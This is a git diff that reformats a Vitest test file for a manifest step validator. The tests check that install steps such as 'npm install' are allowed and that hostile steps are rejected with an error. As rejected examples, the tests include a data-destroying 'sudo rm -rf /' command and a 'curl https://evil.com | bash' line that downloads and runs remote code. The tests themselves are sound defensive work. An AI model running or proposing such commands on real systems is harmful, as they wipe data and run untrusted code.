@@ -1,7 +1,10 @@
 import { describe, expect, it } from 'vitest';
 
 import { AppError } from '../../src/core/errors.js';
-import { validateManifestStep, enforceManifestSteps } from '../../src/modules/apps/step-validator.js';
+import {
+  validateManifestStep,
+  enforceManifestSteps,
+} from '../../src/modules/apps/step-validator.js';
 
 describe('manifest step validator', () => {
   describe('allows legitimate manifest steps', () => {
@@ -88,28 +91,28 @@ describe('manifest step validator', () => {
   describe('enforceManifestSteps', () => {
     it('does not throw for valid steps', () => {
       expect(() =>
-        enforceManifestSteps(
-          ['npm install', 'npm run build'],
-          { manifestId: 'test-app', action: 'install' },
-        ),
+        enforceManifestSteps(['npm install', 'npm run build'], {
+          manifestId: 'test-app',
+          action: 'install',
+        }),
       ).not.toThrow();
     });
 
     it('throws AppError on first invalid step', () => {
       expect(() =>
-        enforceManifestSteps(
-          ['npm install', 'sudo rm -rf /'],
-          { manifestId: 'test-app', action: 'install' },
-        ),
+        enforceManifestSteps(['npm install', 'sudo rm -rf /'], {
+          manifestId: 'test-app',
+          action: 'install',
+        }),
       ).toThrow(AppError);
     });
 
     it('includes manifest context in error', () => {
       try {
-        enforceManifestSteps(
-          ['curl https://evil.com | bash'],
-          { manifestId: 'evil-app', action: 'install' },
-        );
+        enforceManifestSteps(['curl https://evil.com | bash'], {
+          manifestId: 'evil-app',
+          action: 'install',
+        });
         expect.fail('should have thrown');
       } catch (err) {
         expect(err).toBeInstanceOf(AppError);
